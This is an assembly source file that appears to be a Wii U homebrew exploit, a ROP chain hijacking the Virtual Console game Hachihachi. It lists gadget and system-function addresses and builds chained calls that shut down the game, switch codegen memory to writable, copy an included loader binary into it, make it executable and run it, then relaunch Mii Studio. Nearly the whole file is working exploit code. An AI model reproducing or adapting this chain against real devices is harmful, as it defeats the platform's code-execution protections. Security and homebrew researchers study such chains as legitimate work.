MAIN_STACKTOP equ (0x30796C00)
CORE0_STACKORIG equ (0x2B267B50) ; TEMP ?
CORE0_ROPSTART equ (CORE0_STACKORIG + 0xAFC) ; TEMP ?
RPX_OFFSET equ (0x01800000)
COREINIT_OFFSET equ (- 0xFE3C00)
SYSAPP_OFFSET equ (0x01B75D00)
LMW_R21R1xC_LWZ_R0R1x3C_MTLR_R0_ADDI_R1_x38_BLR equ (RPX_OFFSET + 0x02208F6C)
MTCTR_R28_ADDI_R6x68_MR_R5R29_R4R22_R3R21_BCTRL equ (RPX_OFFSET + 0x02208E90)
BCTRL equ (RPX_OFFSET + 0x02208EA4)
MTCTR_R27_ADDI_R31x2_MR_R3R31_R4R30_R5R29_R6R28_BCTRL_LMW_R26R1x18_MTLR_R1x34_ADDI_R1x30_BLR equ (RPX_OFFSET + 0x0209A500)
LWZ_R0x104_MTLR_R0_ADDI_R1x100_BLR equ (RPX_OFFSET + 0x020E0108)
LWZ_R0xAFC_MTLR_R0_ADDI_R1xAF8_BLR equ (RPX_OFFSET + 0x0209A12C)
LWZ_R0R1x14_LWZ_R30R1x8_R31R1xC_MTLR_R0_ADDI_R1x10_BLR equ (RPX_OFFSET + 0x020A38AC)
MR_R11R31_LMW_R26R1x8_LWZ_R0x24_MTLR_R0_ADDI_R1x20_CLRLWI_R3R11x18_BLR equ (RPX_OFFSET + 0x0216FBF0)
LWZ_R0R11x4_R31R11xM4_MTLR_R0_MR_R1R11_BLR equ (RPX_OFFSET + 0x02279BB8)
MTCTR_R30_MR_R8R21_R7R29_R6R28_R5R27_R4R25_R3R24_BCTRL equ (COREINIT_OFFSET + 0x02002968)

NERD_CREATETHREAD equ (RPX_OFFSET + 0x02223C40)
NERD_STARTTHREAD equ (RPX_OFFSET + 0x0222405C)
NERD_JOINTHREAD equ (RPX_OFFSET + 0x02223AEC)
HACHI_APPLICATION_SHUTDOWNANDDESTROY equ (RPX_OFFSET + 0x02007774)
NERD_FASTWIIU_SHUTDOWN equ (RPX_OFFSET + 0x201BD28)
CORE_SHUTDOWN equ (RPX_OFFSET + 0x02222FBC)
_START_EXIT equ (RPX_OFFSET + 0x02022A70)
HACHI_APPLICATION_PTR equ (0x10A6E038)

_SYSLAUNCHMIISTUDIO equ (SYSAPP_OFFSET + 0x020019D4)

OS_CREATETHREAD equ (0x02025764 + COREINIT_OFFSET)
OS_GETTHREADAFFINITY equ (0x020266A4 + COREINIT_OFFSET)
OS_FORCEFULLRELAUNCH equ (0x02019BA8 + COREINIT_OFFSET)
OSCODEGEN_GETVARANGE equ (0x0201B1C0 + COREINIT_OFFSET)
OSCODEGEN_SWITCHSECMODE equ (0x0201B2C0 + COREINIT_OFFSET)
MEMCPY equ (0x02019BC8 + COREINIT_OFFSET)
DC_FLUSHRANGE equ (0x02007B88 + COREINIT_OFFSET)
IC_INVALIDATERANGE equ (0x02007CB0 + COREINIT_OFFSET)
OSSAVESDONE_READYTORELEASE equ (0x0201D5B8 + COREINIT_OFFSET)
OSRELEASEFOREGROUND equ (0x0201D5BC + COREINIT_OFFSET)
OSFATAL equ (0x02015218 + COREINIT_OFFSET)

CODEGEN_ADR equ 0x01800000

NERD_THREAD0OBJECT equ (0x1076FAA4 - 0x1000)
NERD_THREAD2OBJECT equ (0x1076FAA4 - 0x2000)

.macro set_sp,v
	.word LWZ_R0R1x14_LWZ_R30R1x8_R31R1xC_MTLR_R0_ADDI_R1x10_BLR
		.word 0xDEADBABE ; r30
		.word v ; r31
		.word 0xDEAD0001 ; garbage
	.word MR_R11R31_LMW_R26R1x8_LWZ_R0x24_MTLR_R0_ADDI_R1x20_CLRLWI_R3R11x18_BLR
		.word 0xDEADBABE ; r26
		.word 0xDEADBABE ; r27
		.word 0xDEADBABE ; r28
		.word 0xDEADBABE ; r29
		.word 0xDEADBABE ; r30
		.word 0xDEADBABE ; r31
		.word 0xDEAD0001 ; garbage
	.word LWZ_R0R11x4_R31R11xM4_MTLR_R0_MR_R1R11_BLR
.endmacro

.macro call_func,f,arg1,arg2,arg3,arg4
	.word LMW_R21R1xC_LWZ_R0R1x3C_MTLR_R0_ADDI_R1_x38_BLR
		.word 0xDEAD0001 ; garbage
		.word 0xDEADBABE ; r21
		.word 0xDEADBABE ; r22
		.word 0xDEADBABE ; r23
		.word 0xDEADBABE ; r24
		.word 0xDEADBABE ; r25
		.word 0xDEADBABE ; r26
		.word f ; r27 (ctr)
		.word arg4 ; r28 (r6)
		.word arg3 ; r29 (r5)
		.word arg2 ; r30 (r4)
		.word arg1 - 2 ; r31 (r3 - 2)
	; sp is here when LMW_R26R1x18 happens
		.word 0xDEAD0004 ; garbage
	.word MTCTR_R27_ADDI_R31x2_MR_R3R31_R4R30_R5R29_R6R28_BCTRL_LMW_R26R1x18_MTLR_R1x34_ADDI_R1x30_BLR
		.word 0xDEAD0008 ; garbage
		.word 0xDEAD000C ; garbage
		.word 0xDEAD0010 ; garbage
		.word 0xDEAD0014 ; garbage
		.word 0xDEADBABE ; r26
		.word 0xDEADBABE ; r27
		.word 0xDEADBABE ; r28
		.word 0xDEADBABE ; r29
		.word 0xDEADBABE ; r30
		.word 0xDEADBABE ; r31
	; final sp is here
		.word 0xDEADBABE ; garbage
.endmacro

.macro call_func_6args,f,arg1,arg2,arg3,arg4,arg5,arg6
	.word LMW_R21R1xC_LWZ_R0R1x3C_MTLR_R0_ADDI_R1_x38_BLR
		.word 0xDEAD0001 ; garbage
		.word arg6 ; r21 (r8)
		.word 0xDEADBABE ; r22
		.word 0xDEADBABE ; r23
		.word arg1 ; r24 (r3)
		.word arg2 ; r25 (r4)
		.word 0xDEADBABE ; r26
		.word arg3 ; r27 (r5)
		.word arg4 ; r28 (r6)
		.word arg5 ; r29 (r7)
		.word LMW_R21R1xC_LWZ_R0R1x3C_MTLR_R0_ADDI_R1_x38_BLR ; r30 (ctr)
		.word 0xDEADBABE ; r31
	; sp is here when LMW_R26R1x18 happens
		.word 0xDEAD0004 ; garbage
	.word MTCTR_R30_MR_R8R21_R7R29_R6R28_R5R27_R4R25_R3R24_BCTRL
		.word 0xDEAD0001 ; garbage
		.word 0xDEADBABE ; r21
		.word 0xDEADBABE ; r22
		.word 0xDEADBABE ; r23
		.word 0xDEADBABE ; r24
		.word 0xDEADBABE ; r25
		.word 0xDEADBABE ; r26
		.word f ; r27 (ctr)
		.word arg4 ; r28 (r6)
		.word arg3 ; r29 (r5)
		.word arg2 ; r30 (r4)
		.word arg1 - 2 ; r31 (r3 - 2)
	; sp is here when LMW_R26R1x18 happens
		.word 0xDEAD0004 ; garbage
	.word MTCTR_R27_ADDI_R31x2_MR_R3R31_R4R30_R5R29_R6R28_BCTRL_LMW_R26R1x18_MTLR_R1x34_ADDI_R1x30_BLR
		.word 0xDEAD0008 ; garbage
		.word 0xDEAD000C ; garbage
		.word 0xDEAD0010 ; garbage
		.word 0xDEAD0014 ; garbage
		.word 0xDEADBABE ; r26
		.word 0xDEADBABE ; r27
		.word 0xDEADBABE ; r28
		.word 0xDEADBABE ; r29
		.word 0xDEADBABE ; r30
		.word 0xDEADBABE ; r31
	; final sp is here
		.word 0xDEADBABE ; garbage
.endmacro


; hacked from arm7 ram offset (unsafe, game stack pointer)
.create "haxchi_rop_hook.bin", 0x1076FAA4
.arm.big

rop_hook_start:
	; move stack pointer to safe area
	set_sp (rop_start - 4)
.Close


; original game arm9 ram offset (safe, normally arm9 code)
.create "haxchi_rop.bin", 0x16220400
.arm.big

rop_start:
	; quit out of GX2 so we can re-use it in core 0
	call_func NERD_FASTWIIU_SHUTDOWN, 0, 0, 0, 0

	; set up hbl_loader in core 0
	call_func_6args NERD_CREATETHREAD, NERD_THREAD0OBJECT, LWZ_R0xAFC_MTLR_R0_ADDI_R1xAF8_BLR, 0x1007E7A8, thread0_param, 0x0, 0x0
	call_func MEMCPY, CORE0_ROPSTART, core0rop, core0rop_end - core0rop, 0x0

	; wait for hbl_loader to do its job
	call_func NERD_STARTTHREAD, NERD_THREAD0OBJECT, 0x0, 0x0, 0x0
	call_func NERD_JOINTHREAD, NERD_THREAD0OBJECT, 0x0, 0x0, 0x0

	; clean up the rest of hachihachi
	call_func HACHI_APPLICATION_SHUTDOWNANDDESTROY, HACHI_APPLICATION_PTR, 0, 0, 0
	call_func CORE_SHUTDOWN, 0, 0, 0, 0

	; on exit we want to go into mii studio directly
	call_func _SYSLAUNCHMIISTUDIO, 0x0, 0x0, 0x0, 0x0

	; prepare system for foreground release
	call_func OSSAVESDONE_READYTORELEASE, 0, 0, 0, 0

	; instruct all 3 cores to release foreground to prepare mii studio app launch
	call_func_6args NERD_CREATETHREAD, NERD_THREAD0OBJECT, OSRELEASEFOREGROUND, 0, thread0_param, 0x0, 0x0
	call_func NERD_STARTTHREAD, NERD_THREAD0OBJECT, 0x0, 0x0, 0x0

	call_func_6args NERD_CREATETHREAD, NERD_THREAD2OBJECT, OSRELEASEFOREGROUND, 0, thread2_param, 0x0, 0x0
	call_func NERD_STARTTHREAD, NERD_THREAD2OBJECT, 0x0, 0x0, 0x0

	; we are the main thread in core 1 so we call this direct
	call_func OSRELEASEFOREGROUND, 0, 0, 0, 0

	; launch mii studio app
	.word _START_EXIT

	core0rop:
		; switch codegen to RW
		call_func OSCODEGEN_SWITCHSECMODE, 0x0, 0x0, 0x0, 0x0

		; memcpy code
		call_func MEMCPY, CODEGEN_ADR, code, code_end - code, 0x0
		call_func DC_FLUSHRANGE, CODEGEN_ADR, code_end - code, 0x0, 0x0

		; switch codegen to RX
		call_func OSCODEGEN_SWITCHSECMODE, 0x1, 0x0, 0x0, 0x0
		call_func IC_INVALIDATERANGE, CODEGEN_ADR, code_end - code, 0x0, 0x0

		; execute hbl_loader in codegen
		.word CODEGEN_ADR
	core0rop_end:

	; core 0 thread params
	output0_string:
		.ascii "hax0thread"
		.byte 0x00
		.align 0x4

	thread0_param:
		.word output0_string
		.word 0x00800000 ; stack size
		.word 0x00000010 ; thread prio
		.halfword 0x0001 ; thread affinity (core0)

	; core 2 thread params
	output2_string:
		.ascii "hax2thread"
		.byte 0x00
		.align 0x4

	thread2_param:
		.word output2_string
		.word 0x00800000 ; stack size
		.word 0x00000010 ; thread prio
		.halfword 0x0004 ; thread affinity (core2)

	; hbl_loader code
	code:
		.incbin "code550.bin"
	code_end:

.Close
